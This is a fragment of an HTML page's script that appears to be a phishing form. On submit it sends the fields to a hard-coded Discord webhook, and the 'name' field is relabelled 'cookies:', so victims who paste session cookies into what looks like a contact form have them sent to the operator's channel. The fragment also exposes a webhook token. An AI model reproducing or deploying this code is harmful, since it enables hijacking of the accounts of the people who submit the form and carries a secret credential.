
    var webhookURL = "https://discord.com/api/webhooks/1385682310220878027/afYFNNyb7i9UTzYK-mbD3aHsL9IhxvGTxe1XQS3X6hwt40SOR99eZltywtEY0HQGXak4"
    var webhookUsername = "Spidy Bot"
    var webhookAvatar = "https://cdn.discordapp.com/attachments/993616231477284974/993894192583549048/Screenshot_2022-06-09_181712.png"



    $(function() {
        $('#submit').click(function(e) {
        var name = $("#name").val();
        var mail = $("#mail").val();
        var message = $("#message").val();
        $.post(webhookURL,
    {"content": "> @here =============================\n> cookies: " + name + "\n> Email: " + mail + "\n> Message: " + message + "\n> @here =============================\n_ _", "username": webhookUsername, "avatar_url": webhookAvatar})
        });
    });

    function submitted(){
        document.getElementById('status').style.display = "block"
    }
  </script>
</html>
